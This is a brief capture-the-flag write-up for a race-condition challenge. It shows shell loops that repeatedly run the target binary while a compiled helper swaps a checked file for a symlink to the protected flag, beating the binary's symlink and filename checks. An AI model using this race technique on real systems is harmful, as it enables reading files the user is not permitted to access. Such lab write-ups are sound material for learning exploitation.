Same as the last challenge except there is no sleep() in between if the check of the file passed as argument to binary. 
The checks are the same - if the argument is a symlink or contains the string "flag" the program won't print out the flag.
The solution is to run
```
while true; do /babyrace_level2_testing1 /home/ctf/a > /tmp/info; grep pwn /tmp/info; done
```
and
```
gcc -Wall -Wextra exp.c -o exp
while true; do ./exp /home/ctf/a ; done
```
The exp.c file switches the /home/ctf/a file with a symlink to the flag which is then looped.
